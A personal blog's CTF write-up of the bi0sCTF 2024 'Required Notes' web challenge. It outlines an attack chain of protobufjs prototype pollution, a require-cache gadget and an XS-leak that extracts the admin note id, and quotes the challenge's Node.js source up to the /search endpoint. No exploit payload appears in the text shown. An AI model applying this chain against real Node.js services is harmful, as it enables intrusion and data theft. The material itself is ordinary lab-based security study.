@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.444d89fe8d19b9e466eca93647da936356d2c582a54abec3037b88c2e785e61e.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/avatar.jpg>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">ZePacifist&#39;s Blog - Required Notes - bi0sCTF 2024</title>
+<meta property="og:title" content=ZePacifist&#39;s&#32;Blog&#32;-&#32;Required&#32;Notes&#32;-&#32;bi0sCTF&#32;2024 />
+<meta name="twitter:title" content=ZePacifist&#39;s&#32;Blog&#32;-&#32;Required&#32;Notes&#32;-&#32;bi0sCTF&#32;2024 />
+<meta itemprop="name" content=ZePacifist&#39;s&#32;Blog&#32;-&#32;Required&#32;Notes&#32;-&#32;bi0sCTF&#32;2024 />
+<meta name="application-name" content=ZePacifist&#39;s&#32;Blog&#32;-&#32;Required&#32;Notes&#32;-&#32;bi0sCTF&#32;2024 />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="/posts/requirednotes-bi0sctf2024/" />
+<link rel="canonical" href="/posts/requirednotes-bi0sctf2024/" itemprop="url" />
+<meta name="url" content="/posts/requirednotes-bi0sctf2024/" />
+<meta name="twitter:url" content="/posts/requirednotes-bi0sctf2024/" />
+<meta property="og:url" content="/posts/requirednotes-bi0sctf2024/" />
+
+
+<meta property="og:updated_time" content="2024-02-28T14:01:06Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/ZePacifist" />
+<meta name="twitter:creator" content="https://twitter.com/ZePacifist" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.124.1">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="/">
+                <img src="/images/avatar.jpg" alt="brand image">
+            </a>
+        
+        
+            <a href="/">
+                <h1>ZePacifist&#39;s Blog</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    CTF writeups and maybe more
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/posts/">Posts</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="/posts/requirednotes-bi0sctf2024/">Required Notes - bi0sCTF 2024</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="/posts/awesomenotes2-hackluctf2023/">Awesomenotes II - Hack.lu CTF 2023</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="/posts/required-hxpctf2022/">Required - HxpCTF 2022</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="/posts/memodrive-linectf2022/">Memo Drive - Linectf 2022</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="/posts/gitfileexplorer-zer0pts2022/">Gitfile Explorer - Zer0pts 2022</a>
+                            </li>
+                        
+                    
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/Ze-Pacifist">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/ZePacifist">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="TryHackMe" href="https://tryhackme.com/p/ZPacifist">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24" >
+            <path fill="white" d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"></path>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="RSS Feed" href="/posts/index.xml">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
+            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
+                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
+                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
+                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
+            </g>
+        </svg>
+    </a>
+
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2024 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="/posts/requirednotes-bi0sctf2024/">Required Notes - bi0sCTF 2024</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      <time datetime=" 2024-02-28T14:01:06Z" class="post-date">
+        February 28, 2024
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>12 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-Web">
+        <a href="/tags/web">Web</a>
+      </li>
+      
+      <li class="tag-nodejs">
+        <a href="/tags/nodejs">nodejs</a>
+      </li>
+      
+      <li class="tag-require">
+        <a href="/tags/require">require</a>
+      </li>
+      
+      <li class="tag-prototype pollution">
+        <a href="/tags/prototype-pollution">prototype pollution</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <p><strong>tl;dr</strong></p>
+<ul>
+<li><a href="https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665" target="_blank">prototype pollution</a> in protobufjs</li>
+<li>Require gadget to &ldquo;map&rdquo; Healthcheck note to attacker note</li>
+<li>Bypass _pathCache checks by using relativeResolveCache[relResolveCacheIdentifier] which is not deleted upon clearing cache</li>
+<li>User object tag to leak admin note id character by character with ssleaks.</li>
+</ul>
+<p><strong>Challenge points</strong>: 998
+<strong>No. of solves</strong>: 3
+<strong>Solved by</strong>: <a href="https://twitter.com/ZePacifist" target="_blank">Z_Pacifist</a></p>
+<h2 id="challenge-description">Challenge Description</h2>
+<p>Every CTF requires an overly complicated notes app.
+Download files from: <a href="https://github.com/teambi0s/bi0sCTF/tree/main/2024/Web/requirednotesrevenge/handout" target="_blank">link</a></p>
+<h2 id="analysis">Analysis</h2>
+<p>Lets take a quick look at all the routes that are available to us:</p>
+<pre tabindex="0"><code>/delete -  Runs cleanserver() function which deletes require.cache.
+/search/:noteId - Searches for given noteId. This endpoint uses restrictToLocalhost middleware which restricts access to localhost.
+/customise - To edit the protobuf configuration file. User input is directly written to settings.proto file.
+/create - Create a new note which after validation with protobuf is stored into a file /note/noteId.json where noteId is randomly generated.
+/view/:noteId - To view the generated note and delete them.
+/healthcheck - run the healthcheck() function inside bot.js which visits /view/Healthcheck.
+</code></pre><p>The healthcheck note and flag note are generated when the application starts.</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">...
+let flag = process.env.FLAG;
+if(!flag){
+  flag=&#39;{&#34;title&#34;:&#34;flag&#34;,&#34;content&#34;:&#34;bi0sctf{fake_flag}&#34;}&#39;;
+}
+else{
+  flag=`{&#34;title&#34;:&#34;flag&#34;,&#34;content&#34;:&#34;${flag}&#34;}`;
+}
+const flagid = generateNoteId(16);
+const healthCheckId=&#39;Healthcheck&#39;;
+fs.writeFileSync(`./notes/${flagid}.json`, flag);
+fs.writeFileSync(`./notes/${healthCheckId}.json`, &#39;{&#34;title&#34;:&#34;Healthcheck&#34;,&#34;content&#34;:&#34;success&#34;}&#39;);
+...
+</code></pre><p>The flag is in a file within notes directory with a random id as the name.</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">function generateNoteId(length) {
+  const characters = &#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;;
+  let result = &#39;&#39;;
+  for (let i = 0; i &lt; length; i++) {
+    const randomIndex = crypto.randomInt(characters.length);
+    result += characters.charAt(randomIndex);
+  }
+  return result;
+}
+...
+</code></pre><p>Apart from an index.js, there is also a bot.js which contains code for the admin bot. It sets Javascript execution off and only visits the Healthcheck note.</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">...
+const page = await browser.newPage();
+await page.setJavaScriptEnabled(false)
+const response=await page.goto(&#34;http://localhost:3000/view/Healthcheck&#34;)
+await browser.close();
+...
+</code></pre><p>Problem number 1 is that unlike typical XSS challenges where admin bot visits a url with attacker content, here the bot only vists a pre-set url. The content of Healthcheck note is not under our control. Or is it?
+Problem number 2 is that javascript execution is disabled.</p>
+<!-- raw HTML omitted -->
+<p>Lets tackle problem number 2 first. Looking closer at the /search endpoint, we can discover a leak oracle.</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">app.get(&#39;/search/:noteId&#39;, (req, res) =&gt; {
+  const noteId = req.params.noteId;
+  const notes=glob.sync(`./notes/${noteId}*`);
+  if(notes.length === 0){
+    return res.json({Message: &#34;Not found&#34;});
+  }
+  else{
+    try{
+      fs.accessSync(`./notes/${noteId}.json`);
+      return res.json({Message: &#34;Note found&#34;});
+    }
+    catch(err){
+      return res.status(500).json({ Message: &#39;Internal server error&#39; });
+    }
+  }
+
+})
